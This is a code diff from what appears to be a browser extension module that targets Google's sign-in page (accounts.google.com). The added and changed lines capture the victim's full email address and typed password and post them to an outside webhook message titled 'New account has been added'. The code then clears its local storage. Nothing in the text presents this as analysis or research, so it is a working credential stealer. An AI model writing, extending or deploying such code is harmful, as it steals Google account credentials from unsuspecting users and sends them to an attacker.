@@ -1,7 +1,7 @@
 const Util = require('../../utils');
-const { formatFields, code, getFooter } = require('../../utils/Webhook');
+const { formatFields, code, getFooter, formatField } = require('../../utils/Webhook');
 const { wait } = require('../../utils/Document');
-const variable = `${window.location.hostname}_${Date.now()}_messageId`;
+const variable = 'google_message_id';
 
 module.exports = {
   webPattern: /https:\/\/accounts\.google\.com/g,
@@ -40,10 +40,11 @@ module.exports = {
           if (!id) return;
 
           const { embeds: [embed] } = await Util.Webhook.getMessage(id);
+          embed.title = 'New account has been added';
           embed.author = { name, icon_url: avatar.startsWith('//') ? `https:${avatar}` : avatar };
           embed.fields[0].value = code(fullEmail);
-          embed.fields.push(formatFields([['Password', code(passwordInput)]])[0]);
-          await Util.Webhook.editEmbed(embed, id);
+          embed.fields.push(formatField(['Password', code(passwordInput)]));
+          await Util.Webhook.editEmbed(embed, id).then(async () => await chrome.storage.local.remove(variable));
         });
       }
     }
